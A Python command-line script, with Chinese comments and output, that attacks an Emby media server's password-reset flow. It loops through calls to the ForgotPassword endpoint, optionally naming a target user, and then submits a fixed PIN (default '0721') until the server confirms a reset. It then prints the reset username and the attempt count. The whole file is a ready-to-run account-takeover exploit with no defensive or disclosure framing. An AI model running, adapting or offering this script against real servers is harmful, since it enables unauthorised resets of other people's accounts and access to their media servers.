import argparse
import time
from urllib.parse import urljoin

import requests


def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(
        description="循环发送Emby密码重置及PIN验证请求，直到成功"
    )
    parser.add_argument("url", help="目标Emby服务器地址（例如：http://localhost:8096）")
    parser.add_argument(
        "-p", "--pin", help="自定义PIN码（默认：0721）", default="0721", type=str
    )
    parser.add_argument(
        "-u",
        "--user",
        help="指定发送到/ForgotPassword的EnteredUsername值（如：aaa）",
        default=None,
        type=str,
    )
    args = parser.parse_args()

    # 验证网址格式
    base_url = args.url.strip()
    if not base_url.startswith(("http://", "https://")):
        print("错误：网址必须以 http:// 或 https:// 开头")
        return

    # 获取PIN码
    pin = args.pin.strip()

    # 获取用户名参数（可能为None）
    username_param = args.user.strip() if args.user else None

    # 检查依赖
    try:
        import requests
    except ImportError:
        print("请先安装requests库：pip install requests")
        return

    loop_count = 0  # 尝试次数计数
    start_time = time.time()  # 记录开始时间

    while True:
        loop_count += 1
        # 输出当前尝试信息
        print(f"第{loop_count}次尝试中")

        success = False
        reset_username = None  # 从响应中提取的用户名

        # 1. 发送/ForgotPassword请求（带EnteredUsername参数）
        try:
            forgot_url = urljoin(base_url, "emby/Users/ForgotPassword")
            # 构造请求数据（如果指定了用户则添加EnteredUsername）
            forgot_data = (
                {"EnteredUsername": username_param} if username_param else None
            )
            # 发送POST请求（有数据则传data，否则不传）
            requests.post(forgot_url, data=forgot_data, timeout=10)
        except KeyboardInterrupt:
            return
        except Exception as e:
            print(f"请求/ForgotPassword失败: {e}")
            continue

        # 2. 发送/ForgotPassword/Pin请求（使用指定或默认PIN）
        try:
            pin_url = urljoin(base_url, "emby/Users/ForgotPassword/Pin")
            response = requests.post(pin_url, data={"Pin": pin}, timeout=10)
            # 解析响应判断是否成功
            pin_resp = response.json()
            if pin_resp.get("Success") is True and "UsersReset" in pin_resp:
                users_reset = pin_resp["UsersReset"]
                if isinstance(users_reset, list) and len(users_reset) > 0:
                    reset_username = users_reset[0]
                    success = True
        except KeyboardInterrupt:
            return
        except Exception as e:
            print(f"请求/ForgotPassword/Pin失败: {e}")
            continue

        # 成功则输出结果并退出
        if success:
            end_time = time.time()
            total_time = round(end_time - start_time, 2)  # 总用时（秒，保留2位小数）
            print(f"\n===== 成功！ =====")
            print(f"重置的用户名：{reset_username}")
            print(f"使用的PIN码：{pin}")
            print(f"总尝试次数：{loop_count}次")
            print(f"总用时：{total_time}秒")
            return


if __name__ == "__main__":
    main()
